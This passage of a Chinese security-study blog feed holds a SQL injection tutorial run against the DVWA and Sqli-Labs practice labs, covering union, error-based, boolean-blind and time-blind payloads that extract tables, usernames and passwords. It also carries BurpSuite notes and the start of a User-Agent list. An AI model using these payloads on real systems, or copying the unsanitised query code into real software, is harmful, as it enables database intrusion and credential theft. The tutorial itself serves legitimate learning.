class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Retrieve data</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">    $id = $_GET[<span class="string">'id'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span></span><br><span class="line"><span class="php">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $num = mysql_numrows($result);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $i = <span class="number">0</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span></span><br><span class="line"><span class="php">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $i++;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到，对于输入的变量id的值并没有过滤而直接用到SELECT语句中，报错还调用<code>mydql_error()</code>函数显示mysql数据库的报错信息。</p><h4 id="判断是否存在注入，数字型或是字符型"><a href="#判断是否存在注入，数字型或是字符型" class="headerlink" title="判断是否存在注入，数字型或是字符型"></a>判断是否存在注入，数字型或是字符型</h4><p>输入ID为<code>1&#39;</code>是出现报错提示，此时的执行语句是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = <span class="string">'1''</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</span><br></pre></td></tr></table></figure><p>输入ID为<code>1&#39; and &#39;1&#39;=&#39;1</code>时</p><p>显示结果:</p><p><img src="fig1.png" alt="结果1"></p><p>此时的执行语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure><p>输入ID为<code>1&#39; or &#39;1&#39; = &#39;1</code>1时（or 使 where子句始终成立）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> user_id = <span class="string">'1'</span> <span class="keyword">or</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure><p><img src="fig2.png" alt="结果2"></p><p>结果显示了所有用户信息。以上实验说明存在字符型注入。</p><h4 id="猜解字段数"><a href="#猜解字段数" class="headerlink" title="猜解字段数"></a>猜解字段数</h4><p>此时输入<code>1&#39; order by 3 #</code>报错，说明只有两个字段，<code>#</code>为注释符。</p><h4 id="获取当前数据库和数据库用户名"><a href="#获取当前数据库和数据库用户名" class="headerlink" title="获取当前数据库和数据库用户名"></a>获取当前数据库和数据库用户名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>显示结果为：</p><p><img src="fig3.png" alt="当前数据库和数据库用户名"></p><h4 id="获取当前数据库版本和操作系统"><a href="#获取当前数据库版本和操作系统" class="headerlink" title="获取当前数据库版本和操作系统"></a>获取当前数据库版本和操作系统</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="keyword">version</span>(),@@version_compile_os<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>显示结果为：</p><p><img src="fig4.png" alt="当前数据库版本和操作系统"></p><p>我们需要判断MySQL的版本。</p><ul><li>因为当MySQL的版本小于4.0时，是不支持union select联合查询的;</li><li>当MySQL版本大于 5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</li></ul><h4 id="获取数据表名"><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> table_name,table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema= <span class="string">'dvwa'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig5.png" alt="数据表名"></p><p>获得结果分别为：<code>guestbook, users</code></p><h4 id="获取表中的列名"><a href="#获取表中的列名" class="headerlink" title="获取表中的列名"></a>获取表中的列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到的结果为</p><p><img src="fig6.png" alt="列名"></p><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig7.png" alt="数据"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><p>报错注入用于没有显位的SQL注入，可以用来替代盲注。</p><p>当在一个聚合函数，比如 <code>count</code> 函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 这些函数分别是:</p><ul><li><code>Rand()</code> //随机函数</li><li><code>Floor()</code> //取整函数</li><li><code>Count()</code> //聚合函数</li><li><code>Group by key</code> //分组语句</li></ul><p>例如，利用<code>floor()</code>语句报错，是利用<code>floor()</code>,<code>count()</code>,<code>group() by</code>冲突报错，当这三个函数在特定情况一起使用产生的 错误。</p><p>===</p><ul><li><p><code>ExtractValue()</code>: 使用XPath表示法从XML字符串中提取值<br>  <code>ExtractValue(xml_frag, xpath_expr)</code>接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p></li><li><p><code>UpdateXML()</code>: 返回替换的XML片段</p><p>  <code>UpdateXML(xml_target, xpath_expr, new_xml)</code> 此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <code>xml_target</code> 新的XML片段 <code>new_xml</code> ，然后返回更改的XML。<code>xml_target</code>替换的部分 与<code>xpath_expr</code> 用户提供的<code>XPath</code>表达式匹配。如果未<code>xpath_expr</code>找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <code>xml_targetXML</code>片段。所有三个参数都应该是字符串。</p></li></ul><p><code>extractvalue</code>注入的原理:依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。 所以报错。</p><h3 id="报错注入实例"><a href="#报错注入实例" class="headerlink" title="报错注入实例"></a>报错注入实例</h3><p>本实例使用Sqli-Labs平台的 Challenge # 17 进行。其中，源代码中的<code>check_input()</code>函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@$sql = <span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row) &#123;</span><br><span class="line">    $row1 = $row[<span class="string">'username'</span>];</span><br><span class="line">    $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>; mysql_query($update);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mysql_error())</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag1.jpg"/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg"/&gt;'</span>;</span><br></pre></td></tr></table></figure><p><code>check_input()</code>中，对 username 进行各种转义的处理，所以此处不能使用 username 进行注入。</p><h3 id="extractvalue报错注入流程"><a href="#extractvalue报错注入流程" class="headerlink" title="extractvalue报错注入流程"></a>extractvalue报错注入流程</h3><p>使用<code>extractvalue()</code>，首先得知数据库中存在admin账户。</p><h4 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig8.png" alt="版本信息"></p><h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig9.png" alt="数据库名"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig10.png" alt="表名"></p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig11.png" alt="列名"></p><h4 id="extractvalue获取数据"><a href="#extractvalue获取数据" class="headerlink" title="extractvalue获取数据"></a>extractvalue获取数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> a),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="fig12.png" alt="获取数据"></p><h3 id="updatexml报错注入流程"><a href="#updatexml报错注入流程" class="headerlink" title="updatexml报错注入流程"></a>updatexml报错注入流程</h3><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=' or updatexml(1,concat('<span class="comment">#',(database())),0)--+</span></span><br></pre></td></tr></table></figure><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=' or updatexml(1,concat('<span class="comment">#',(select group_concat(table_name) from information_schema.tables where table_schema='security')),0)--+</span></span><br></pre></td></tr></table></figure><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=' or updatexml(1,concat('<span class="comment">#',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),0)--+</span></span><br></pre></td></tr></table></figure><h4 id="updatexml获取数据"><a href="#updatexml获取数据" class="headerlink" title="updatexml获取数据"></a>updatexml获取数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=' or updatexml(1,concat('<span class="comment">#',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),0)--+</span></span><br></pre></td></tr></table></figure><h3 id="报错注入参考链接"><a href="#报错注入参考链接" class="headerlink" title="报错注入参考链接"></a>报错注入参考链接</h3><p><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></p><p><a href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html" target="_blank" rel="noopener">报错注入:extractvalue、updatexml报错原理</a></p><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">基于extractvalue()和updatexml()的报错注入</a></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="布尔适用范围"><a href="#布尔适用范围" class="headerlink" title="布尔适用范围"></a>布尔适用范围</h3><p>在联合查询和报错注入都不适用的情况下，考虑的一种手工注入方式。</p><p>优点：遍历的方法可以准确查出数据。<br>缺点：过程繁琐。</p><h3 id="DVWA盲注源码"><a href="#DVWA盲注源码" class="headerlink" title="DVWA盲注源码"></a>DVWA盲注源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="布尔盲注流程"><a href="#布尔盲注流程" class="headerlink" title="布尔盲注流程"></a>布尔盲注流程</h3><h4 id="布尔盲注常用函数"><a href="#布尔盲注常用函数" class="headerlink" title="布尔盲注常用函数"></a>布尔盲注常用函数</h4><ul><li><code>length()</code> 返回字符串的长度，例如可以返回数据库名字的长度 <code>substr()</code> 用来截取字符串</li><li><code>ascii()</code> 返回字符的ascii码</li><li><code>sleep(n)</code> 将程序挂起一段时间，n为n秒</li><li><code>if(expr1,expr2,expr3)</code> 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</li></ul><h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p><code>1&#39; and 1=1 #</code></p><p><code>1&#39; and 1=2 #</code></p><h4 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h4><p>猜长度：</p><p>输入<code>1&#39; and length(database())=4 #</code>，显示存在;</p><p>二分法逐字猜解：</p><p>输入<code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code>，显示存在，说明数据库名的第一个字符的ascii值大于 97(小写字母a的ascii值);<br>输入<code>1&#39; and ascii(substr(database(),1,1))&gt;100 #</code>，显示不存在，说明数据库名的第一个字符的ascii值不 大于100(小写字母d的ascii值)，所以数据库名的第一个字符的ascii值为100，即小写字母d。<br>…<br>重复以上步骤直到得出完整的数据库名dvwa</p><h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><p>猜解表的数量</p><p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2 #</code> 显示存在</p><p>猜解第一个表名长度</p><p><code>1&#39; and length(substr((select table_name from information_schema.tables table_schema=database() limit 0,1),1))=9 #</code> 显示存在</p><p>猜解第一个表的名字</p><p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),n,1))&gt;97 #</code></p><p>重复操作，猜解出表名为guestbook、users</p><h4 id="猜解表中的字段名"><a href="#猜解表中的字段名" class="headerlink" title="猜解表中的字段名"></a>猜解表中的字段名</h4><p>猜解字段的数量</p><p><code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=8 #</code> 显示存在</p><p>猜解第一个字段的长度</p><p><code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=7 #</code> 显示存在</p><p>猜解第一个字段名</p><p><code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1,1))&gt;97 #</code> 显示存在</p><h4 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h4><p>二分法猜解数据</p><p><code>and ascii(substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #</code><br>…</p><p>暴力猜解</p><p><code>1&#39; and (select count(*) from users where user = &#39;admin&#39;) = 1 #</code></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注应用场景"><a href="#时间盲注应用场景" class="headerlink" title="时间盲注应用场景"></a>时间盲注应用场景</h3><p>当页面完全没有回显时用时间盲注。</p><h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><p>格式:<code>IF(Condition,A,B)</code></p><p>含义:如果Condition成立，则A，否则B</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><ul><li>mysql&gt;=5.0 使用sleep()进行查询</li><li>mysql&lt;5.0 使用benchmark()进行查询</li></ul><p><code>benchmark</code>是通过查询次数增多，时间变得缓慢来判断是否存在延迟</p><p><code>select benchmark(1000,select * from admin);</code></p><p>判断流程与布尔盲注差不多。</p><h3 id="时间盲注参考文章"><a href="#时间盲注参考文章" class="headerlink" title="时间盲注参考文章"></a>时间盲注参考文章</h3><p><a href="https://www.cnblogs.com/-zhong/p/10931563.html" target="_blank" rel="noopener">参考1</a><br><a href="https://blog.csdn.net/DarkHQ/article/details/79274376" target="_blank" rel="noopener">参考2</a><br><a href="http://www.admintony.com/MYSQL%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener">参考3</a><br><a href="https://bbs.ichunqiu.com/thread-15248-1-1.html" target="_blank" rel="noopener">时间盲注脚本</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite入门笔记</title>
      <link href="/2020/04/25/Burpsuite-notes/"/>
      <url>/2020/04/25/Burpsuite-notes/</url>
      
        <content type="html"><![CDATA[<h2 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h2><p>网站爬行顺序：Proxy抓取请求 -&gt; 发送到Repeater -&gt; 发送到Spider -&gt; 开始爬取网站 -&gt; 在Target中可查看结果。</p><p>爬行网站线程数可以设置为2-10，大型网站可以更多。</p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>漏洞扫描，在扫描之前需要做一个Spider。</p><p>roxy抓取请求 -&gt; Spider爬行 -&gt; 在Target标签下的Sitemap中，选择Active scan this host -&gt; Do an active scan。</p><h2 id="BurpSuite无法抓取本地包的解决方案"><a href="#BurpSuite无法抓取本地包的解决方案" class="headerlink" title="BurpSuite无法抓取本地包的解决方案"></a>BurpSuite无法抓取本地包的解决方案</h2><p>本地电脑系统是Mac OS Catalina 10.15.4，用Chrome、火狐都不能抓部署在本地的网站的包，可能是本机系统有设置代理时过滤”127.0.0.1”和”localhost”。</p><p>解决方案：</p><ol><li>确保配置浏览器代理时，去掉勾选”过滤本机IP地址“选项。</li><li>可以使用本机IP（192.168.xxx.xxx）代替“127.0.0.1”访问页面。</li><li>另一种方法：可以修改本地hosts文件，将本机IP指向“127.0.0.1”或者绑定一个域名到“127.0.0.1”也可以解决。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblzogs.com/Icey-Blog/articles/7513303.html" target="_blank" rel="noopener">burp suite超级详解</a><br><a href="https://www.cnblogs.com/pshell/p/7979653.html" target="_blank" rel="noopener">Burp Suite渗透操作指南–暴力破解</a><br><a href="https://www.cnblogs.com/pshell/p/7979649.html" target="_blank" rel="noopener">Burp Suite渗透实战操作指南-上篇</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器User-Agent整理</title>
      <link href="/2020/04/25/Useragent-book/"/>
      <url>/2020/04/25/Useragent-book/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>UserAgent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，UserAgent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。UA可以进行伪装。<br>浏览器的UA字串的标准格式：浏览器标识(操作系统标识;加密等级标识;浏览器语言)渲染引擎标识版本信息。但各个浏览器有所不同。</p><a id="more"></a><h3 id="浏览器标识"><a href="#浏览器标识" class="headerlink" title="浏览器标识"></a>浏览器标识</h3><p>出于兼容及推广等目的，很多浏览器的标识相同，因此浏览器标识并不能说明浏览器的真实版本，真实版本信息在UA字串尾部可以找到。</p><h3 id="操作系统标识"><a href="#操作系统标识" class="headerlink" title="操作系统标识"></a>操作系统标识</h3><p>FreeBSD:</p><ul><li>X11;FreeBSD(version no.)i386</li><li>X11;FreeBSD(version no.)AMD64</li></ul><p>Linux:</p><ul><li>X11;Linux ppc</li><li>X11;Linux ppc64</li><li>X11;Linux i686</li><li>X11;Linux x86_64</li></ul><p>Mac:</p><ul><li>Macintosh;PPC Mac OS X</li><li>Macintosh;Intel Mac OS X</li></ul><p>Solaris:</p><ul><li>X11;SunOS i86pc</li><li>X11;SunOs sun4u</li></ul><p>Windows:</p><ul><li>Windows NT 6.1   对应windows7</li><li>Windows NT 6.0   对应windows Vista</li><li>Windows NT 5.2  对应windows 2003</li><li>Windows NT 5.1   对应windows xp</li><li>Windows NT 5.0   对应windows 2000</li><li>Windows ME</li><li>Windows 98</li></ul><h3 id="加密等级标识"><a href="#加密等级标识" class="headerlink" title="加密等级标识"></a>加密等级标识</h3><ul><li>N:表示无安全加密</li><li>I:表示弱安全加密</li><li>U:表示强安全加密</li></ul><h3 id="浏览器语言"><a href="#浏览器语言" class="headerlink" title="浏览器语言"></a>浏览器语言</h3><p>在首选项&gt;常规&gt;语言中指定的语言</p><h3 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h3><p>显示浏览器使用的主流渲染引擎有：Gecko、WebKit、KHTML、Presto、Trident、Tasman等，格式为：渲染引擎/版本信息</p><h3 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h3><p>显示浏览器的真实版本信息，格式为：浏览器/版本信息</p><h2 id="PC浏览器大全"><a href="#PC浏览器大全" class="headerlink" title="PC浏览器大全"></a>PC浏览器大全</h2><h3 id="Opera"><a href="#Opera" class="headerlink" title="Opera"></a>Opera</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60</span><br><span class="line">Opera/8.0 (Windows NT 5.1; U; en)</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50</span><br></pre></td></tr></table></figure><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><figure 